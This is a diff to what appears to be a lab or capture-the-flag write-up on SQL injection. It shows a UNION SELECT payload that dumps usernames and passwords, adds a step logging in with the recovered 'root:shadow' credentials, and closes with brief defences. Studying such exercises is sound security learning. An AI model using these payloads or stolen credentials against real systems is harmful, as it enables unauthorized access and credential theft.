@@ -29,6 +29,10 @@ Since we are not allowed to use automated tools like sqlmap.
 ```
  5 union SELECT username,password FROM Member_Brute_Force.db_default
 ```
+6. Now we have go to the sign in area and try: root:shadow
+```
+ Log in using Username:root Password: shadow
+```
 ### How to protect
  - use ORM system
  - Input Validation like restricting input size, and if the data is a name it doesnt have to contain numbers  and if the data is a number we could block string from it.
